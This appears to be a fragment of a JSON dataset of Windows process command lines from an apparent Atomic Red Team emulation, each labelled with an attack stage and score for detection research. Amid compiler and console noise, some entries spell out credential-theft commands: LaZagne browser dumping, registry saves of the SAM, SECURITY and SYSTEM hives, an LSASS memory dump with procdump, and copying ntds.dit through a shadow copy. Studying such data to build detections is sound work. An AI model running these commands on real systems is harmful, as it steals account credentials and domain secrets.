+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES9DFD.tmp   c:/Users/Administrator/AppData/Local/Temp/yajshw1q/CSCC27C022EA157424789D83980FB41D195.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "9863e87ac72c1925adc4f266bf99c824"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "Establish Foothold",
+        "stage_score": "10.0",
+        "raw_cmd": "conhost",
+        "id": "a5a3a54771069c119f39870e132cb356"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESC646.tmp   c:/Users/Administrator/AppData/Local/Temp/fhwdixby/CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESC646.tmp   c:/Users/Administrator/AppData/Local/Temp/fhwdixby/CSC6CAA6AA7A0DE43F3812D4EDDDF7BD98.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "3c3ef21fee15d93d2d83ac6d288b04f8"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/lbfowsgp/lbfowsgp.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "5932abe52fabb99ec8b4fb8ee3e92aa4"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "8c7bb7f484f2f265f83287490cf2ddb5"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA911.tmp   c:/Users/Administrator/AppData/Local/Temp/lbfowsgp/CSC5C7822791F754E7486A439DAA52914D.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA911.tmp   c:/Users/Administrator/AppData/Local/Temp/lbfowsgp/CSC5C7822791F754E7486A439DAA52914D.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "aeaddb88ea0df0a2fc129891fa59706b"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA568.tmp   c:/Users/Administrator/AppData/Local/Temp/rj51a2aa/CSC69987A1E891048F297459D71D0A9C759.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESA568.tmp   c:/Users/Administrator/AppData/Local/Temp/rj51a2aa/CSC69987A1E891048F297459D71D0A9C759.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "084aa9b4eee6ba098e9c41f9c0f70864"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "864589f3b7c5299f9ef01a27b4979b8f"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/oztnp4xi/oztnp4xi.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "99eedf0076ac1a6f94aebdbb81ea45f9"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF9F0.tmp   c:/Users/Administrator/AppData/Local/Temp/oztnp4xi/CSC2E1569416EFF4A7B814A818C1E193C.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF9F0.tmp   c:/Users/Administrator/AppData/Local/Temp/oztnp4xi/CSC2E1569416EFF4A7B814A818C1E193C.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "c0d8d8234b4036793960fd97cfcee27e"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF666.tmp   c:/Users/Administrator/AppData/Local/Temp/b1oyrudp/CSC66C299FECC14DEFBFB5E77107D6CAE.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF666.tmp   c:/Users/Administrator/AppData/Local/Temp/b1oyrudp/CSC66C299FECC14DEFBFB5E77107D6CAE.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "8ac931e5618a6200e6557ae769b21c1d"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES971B.tmp   c:/Users/Administrator/AppData/Local/Temp/kv5u34xf/CSC843437488743C18614B83C6BFAB629.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES971B.tmp   c:/Users/Administrator/AppData/Local/Temp/kv5u34xf/CSC843437488743C18614B83C6BFAB629.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "fe97fdb55cc2e2ca244e97c5a0c2445a"
+    },
+    {
+        "cmd": "lazagne1.exe  browsers",
+        "label": "lazagne1.exe  browsers",
+        "stage": "Establish Foothold",
+        "stage_score": "246.99999999999991",
+        "raw_cmd": "lazagne1",
+        "id": "4b1d560f1821ad43a18427b64366b8fa"
+    },
+    {
+        "cmd": "\"cmd.exe /c  reg.exe save hklm/security c:/users/admini~1/appdata/local/temp/tjbvkjpetfjp \"",
+        "label": "\"cmd.exe /c  reg.exe save hklm/security c:/users/admini~1/appdata/local/temp/tjbvkjpetfjp \"",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "11.0",
+        "id": "342ae1eab1c260316fe2d61acae7c124"
+    },
+    {
+        "cmd": "\"cmd.exe /c  reg.exe save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf \"",
+        "label": "\"cmd.exe /c  reg.exe save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf \"",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "11.0",
+        "id": "fbcad28e9f3572c21ff47286680ec8a4"
+    },
+    {
+        "cmd": "\"cmd.exe /c  reg.exe save hklm/system c:/users/admini~1/appdata/local/temp/qsdirkg \"",
+        "label": "\"cmd.exe /c  reg.exe save hklm/system c:/users/admini~1/appdata/local/temp/qsdirkg \"",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "11.0",
+        "id": "ff4efeb67238ca4304c82b5e12482f28"
+    },
+    {
+        "cmd": "reg.exe  save hklm/security c:/users/admini~1/appdata/local/temp/tjbvkjpetfjp",
+        "label": "reg.exe  save hklm/security c:/users/admini~1/appdata/local/temp/tjbvkjpetfjp",
+        "stage": "Establish Foothold",
+        "stage_score": "8.2",
+        "raw_cmd": "reg",
+        "id": "21eda83975d0099e3a67781c635afb56"
+    },
+    {
+        "cmd": "reg.exe  save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf",
+        "label": "reg.exe  save hklm/sam c:/users/admini~1/appdata/local/temp/tthwwf",
+        "stage": "Establish Foothold",
+        "stage_score": "8.2",
+        "raw_cmd": "reg",
+        "id": "e1a1cb04ed4d69f7ad8bc98fbafbf696"
+    },
+    {
+        "cmd": "reg.exe  save hklm/system c:/users/admini~1/appdata/local/temp/qsdirkg",
+        "label": "reg.exe  save hklm/system c:/users/admini~1/appdata/local/temp/qsdirkg",
+        "stage": "Establish Foothold",
+        "stage_score": "8.2",
+        "raw_cmd": "reg",
+        "id": "50714ac93f42c80e4c19f1bc65d411b3"
+    },
+    {
+        "cmd": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+        "label": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+        "stage": "Escalate Privilege",
+        "stage_score": "16.2",
+        "raw_cmd": "procdump64",
+        "id": "5c1f1ec6667430a87316f608d94b08fb"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES1013.tmp   c:/Users/Administrator/AppData/Local/Temp/nruqy5cg/CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES1013.tmp   c:/Users/Administrator/AppData/Local/Temp/nruqy5cg/CSC1FF97C2055D449BBBEB87BE2E99DAF3.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.2",
+        "raw_cmd": "cvtres",
+        "id": "c8b1e89c62ea01bd4a3e154bd8affc83"
+    },
+    {
+        "cmd": "wmic  /node: localhost  shadowcopy call create Volume=C:/",
+        "label": "wmic  /node: localhost  shadowcopy call create Volume=C:/",
+        "stage": "Establish Foothold",
+        "stage_score": "20.4",
+        "raw_cmd": "WMIC",
+        "id": "ce2a88230e5215b520bd7f749e810671"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "d5768a9b5eafa1c0619b7810ff7a15a3"
+    },
+    {
+        "cmd": "reg  save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
+        "label": "reg  save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "reg",
+        "id": "e4b728e6fb1fe41b458a1f81624ff297"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "e714c58e7dc3c4c47db077a2fb03f50c"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "46f1c3c79cbc042d741a083f85dbc656"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "14acc07a7646468c0bafa23fc51d1b08"
+    },
+    {
+        "cmd": "wmic  shadowcopy call create Volume=C:/",
+        "label": "wmic  shadowcopy call create Volume=C:/",
+        "stage": "Establish Foothold",
+        "stage_score": "20.4",
+        "raw_cmd": "WMIC",
+        "id": "d311c6ed3b0cf08455abd5b1cde72150"
+    },
+    {
+        "cmd": "vssadmin.exe  create shadow /for=C:",
+        "label": "vssadmin.exe  create shadow /for=C:",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "vssadmin",
+        "id": "1950e4c09a3c31d060119935a6b02815"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "c81554b2ee1506324196e72b7fc40357"
+    },
+    {
+        "cmd": "vssadmin.exe  create shadow /for=C:",
+        "label": "vssadmin.exe  create shadow /for=C:",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "vssadmin",
+        "id": "01c0fc29bf327d156e8965ae3caee07b"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "3a9600927b72e757973384548379cd3e"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/c10mxv53/c10mxv53.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "24e5e152c70094f669e74bec8a230515"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "47b9c38424ef4e46169b7de1b3aac3e5"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF4B2.tmp   c:/Users/Administrator/AppData/Local/Temp/c10mxv53/CSC6E5F326E65CB4C8CA191B86445142CF2.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESF4B2.tmp   c:/Users/Administrator/AppData/Local/Temp/c10mxv53/CSC6E5F326E65CB4C8CA191B86445142CF2.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "bef84199ca8703a9473406793315189c"
+    },
+    {
+        "cmd": "wmic  /node: localhost  process call create  cmd.exe /c esentutl.exe /y /vss c:/windows/ntds/ntds.dit /d c:/ntds.dit",
+        "label": "wmic  /node: localhost  process call create  cmd.exe /c esentutl.exe /y /vss c:/windows/ntds/ntds.dit /d c:/ntds.dit",
+        "stage": "Establish Foothold",
+        "stage_score": "30.799999999999997",
+        "raw_cmd": "WMIC",
+        "id": "4b451debdfbe42f32fd5244a47d64b0c"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "798e891c89858fd138fe1c25e5b4a6fa"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/net1 group  domain admins  /domain",
+        "label": "C:/WINDOWS/system32/net1 group  domain admins  /domain",
+        "stage": "Maintain Persistence",
+        "stage_score": "5.0",
+        "raw_cmd": "net1",
+        "id": "d2eb3ad6a536c74d3c752b140426a45c"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES3C0B.tmp   c:/Users/Administrator/AppData/Local/Temp/rkdbei0g/CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES3C0B.tmp   c:/Users/Administrator/AppData/Local/Temp/rkdbei0g/CSC7719DDB768E945B2A8F7EA9F7EEAEFD4.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.2",
+        "raw_cmd": "cvtres",
+        "id": "9a71b6f5d23c9ccdd901b3cfad8aa8d3"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "28b92fabeee1f17f2ae53a8163e57869"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/dlshnqqn/dlshnqqn.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "848d27c9a2e82cf8607331bbfaf73e4c"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE377.tmp   c:/Users/Administrator/AppData/Local/Temp/dlshnqqn/CSC41612F346602455D895E54A0C6B7543A.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE377.tmp   c:/Users/Administrator/AppData/Local/Temp/dlshnqqn/CSC41612F346602455D895E54A0C6B7543A.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "7b8aaade18faecc9db7a92855ca0216b"
+    },
+    {
+        "cmd": "sc  query type=service",
+        "label": "sc  query type=service",
+        "stage": "Establish Foothold",
+        "stage_score": "8.2",
+        "raw_cmd": "sc",
+        "id": "28df61e34c38cf8bb31057719bd71c36"
+    },
+    {
+        "cmd": "tree  C:/AtomicRedTeam/atomics",
+        "label": "tree  C:/AtomicRedTeam/atomics",
+        "stage": "Establish Foothold",
+        "stage_score": "8.2",
+        "raw_cmd": "tree",
+        "id": "2c315afbb87bf1f8a4d76b6b092c4c32"
+    },
+    {
+        "cmd": "wmic  process list",
+        "label": "wmic  process list",
+        "stage": "Establish Foothold",
+        "stage_score": "41.6",
+        "raw_cmd": "WMIC",
+        "id": "642537170a52f6f56dc48c72963d8d9a"
+    },
+    {
+        "cmd": "doskey  /history",
+        "label": "doskey  /history",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "doskey",
+        "id": "6f402df2752c57cb981ac4940cc6f827"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "762ff7e8841774fe79eaefd4b98fef3c"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/cmd.exe  /S /D /c  dir c: /b /s .docx",
+        "label": "C:/WINDOWS/system32/cmd.exe  /S /D /c  dir c: /b /s .docx",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "cmd",
+        "id": "5377560cff056698bc3091463410fcbe"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "ec67110d7643774936a7deb732230674"
+    },
+    {
+        "cmd": "findstr  /e .docx",
+        "label": "findstr  /e .docx",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "findstr",
+        "id": "f5c9c661a3b8223737e82dedbb0cdc6c"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESDD4D.tmp   c:/Users/Administrator/AppData/Local/Temp/ngon5zfo/CSCDE7D66C55CE4B34921037B59D738.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESDD4D.tmp   c:/Users/Administrator/AppData/Local/Temp/ngon5zfo/CSCDE7D66C55CE4B34921037B59D738.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.2",
+        "raw_cmd": "cvtres",
+        "id": "a0189eac0beac9dd051a62686fe3ee9e"
+    },
+    {
+        "cmd": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "label": "/??/C:/WINDOWS/system32/conhost.exe 0xffffffff -ForceV1",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "conhost",
+        "id": "641c50ddbba159743f1d85b17993b4c0"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/gpflxjkd/gpflxjkd.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "f80dace5b1042f612172106625c4b235"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE173.tmp   c:/Users/Administrator/AppData/Local/Temp/gpflxjkd/CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RESE173.tmp   c:/Users/Administrator/AppData/Local/Temp/gpflxjkd/CSC86B0AA0D27684DF1B4E2DE43A4DCAD2.TMP",
+        "stage": "Establish Foothold",
+        "stage_score": "16.4",
+        "raw_cmd": "cvtres",
+        "id": "d259f8d37e7f8146c5ae2e8913d0e27d"
+    }
+]
